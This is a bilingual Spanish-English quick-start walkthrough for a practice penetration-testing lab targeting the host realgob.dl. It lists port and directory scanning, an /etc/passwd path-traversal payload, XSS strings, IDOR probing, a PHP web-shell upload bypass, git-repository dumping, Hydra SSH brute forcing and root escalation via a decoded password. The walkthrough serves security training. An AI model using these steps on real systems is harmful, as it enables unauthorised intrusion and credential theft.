# Guía de Inicio Rápido - Laboratorio Report

## Para Comenzar (Español)

Siga estos pasos para replicar la evaluación de seguridad del laboratorio Report:

### 1. Escanear los Puertos del Objetivo

Ejecute un escaneo Nmap para identificar servicios activos:

```bash
nmap -T4 -sV -p- -A realgob.dl
```

**Resultado esperado**: Puertos 22 (SSH), 80 (HTTP) y 3306 (MySQL) abiertos

### 2. Descubrir Directorios Ocultos

Escanee directorios usando Gobuster:

```bash
gobuster dir -u http://realgob.dl -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Directorios clave a identificar**: info.php, uploads/, admin.php, database.php, api.php, desarrollo/

### 3. Probar Vulnerabilidades Web

#### 3a. LFI en la sección "Acerca de":
```
Acceda a: http://realgob.dl/acerca-de/?page=../../../../etc/passwd
```

#### 3b. XSS en formulario de contacto:
```
Nombre: <script>alert('XSS')</script>
Mensaje: <script>alert(1)</script>
```

#### 3c. IDOR en perfiles de usuario:
```
1. Registre un usuario: usuario=test, contraseña=test
2. Inicie sesión
3. Acceda a: http://realgob.dl/user-profile.php?id=1
4. Pruebe cambiar el ID (2, 3, 4, etc.)
```

### 4. Explotar Carga de Archivos

Intercepte la solicitud con Burp Suite:

```bash
burpsuite
```

**Pasos**:
1. Vaya a la sección "Cargas"
2. Intente subir `shell.php`
3. Intercepte la solicitud en Burp
4. Cambie `Content-Type` de `application/x-php` a `image/gif`
5. Envíe la solicitud modificada
6. Acceda al archivo en: `http://realgob.dl/uploads/shell.php`

### 5. Extraer Repositorio Git Expuesto

Clone el repositorio usando git-dumper:

```bash
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
python3 git_dumper.py http://realgob.dl/desarrollo/.git/ dump
cat dump/users.txt
```

### 6. Acceso SSH por Fuerza Bruta

Use Hydra con credenciales del repositorio Git:

```bash
hydra -L users.txt -P passwords.txt ssh://realgob.dl -t 4
ssh adm@realgob.dl
# Ingrese la contraseña obtenida
```

### 7. Escalada de Privilegios a Root

Dentro de la sesión SSH:

```bash
cat /etc/app_config/db.conf
# Obtener credenciales de base de datos
echo $MY_PASS
# Convertir valor hexadecimal a texto plano (usar herramienta en línea)
# Probar contraseña como root
su -
# Ingrese la contraseña decodificada
whoami  # Debe mostrar "root"
```

---

## Quick Start Guide (English)

Follow these steps to replicate the Report laboratory security assessment:

### 1. Scan Target Ports

Run a Nmap port scan to identify active services:

```bash
nmap -T4 -sV -p- -A realgob.dl
```

**Expected result**: Ports 22 (SSH), 80 (HTTP), and 3306 (MySQL) open

### 2. Discover Hidden Directories

Scan directories using Gobuster:

```bash
gobuster dir -u http://realgob.dl -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Key directories to identify**: info.php, uploads/, admin.php, database.php, api.php, desarrollo/

### 3. Test Web Vulnerabilities

#### 3a. LFI in "About" section:
```
Access: http://realgob.dl/acerca-de/?page=../../../../etc/passwd
```

#### 3b. XSS in contact form:
```
Name: <script>alert('XSS')</script>
Message: <script>alert(1)</script>
```

#### 3c. IDOR in user profiles:
```
1. Register a user: user=test, password=test
2. Log in
3. Access: http://realgob.dl/user-profile.php?id=1
4. Try changing the ID (2, 3, 4, etc.)
```

### 4. Exploit File Upload

Intercept the request with Burp Suite:

```bash
burpsuite
```

**Steps**:
1. Go to "Cargas" section
2. Try uploading `shell.php`
3. Intercept the request in Burp
4. Change `Content-Type` from `application/x-php` to `image/gif`
5. Send the modified request
6. Access the file at: `http://realgob.dl/uploads/shell.php`

### 5. Extract Exposed Git Repository

Clone the repository using git-dumper:

```bash
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
python3 git_dumper.py http://realgob.dl/desarrollo/.git/ dump
cat dump/users.txt
```

### 6. SSH Brute Force Access

Use Hydra with credentials from Git repository:

```bash
hydra -L users.txt -P passwords.txt ssh://realgob.dl -t 4
ssh adm@realgob.dl
# Enter the obtained password
```

### 7. Privilege Escalation to Root

Inside the SSH session:

```bash
cat /etc/app_config/db.conf
# Get database credentials
echo $MY_PASS
# Convert hexadecimal value to plain text (use online tool)
# Try password as root
su -
# Enter the decoded password
whoami  # Should show "root"
```

---

**Tiempo estimado**: 2-3 horas | **Estimated time**: 2-3 hours
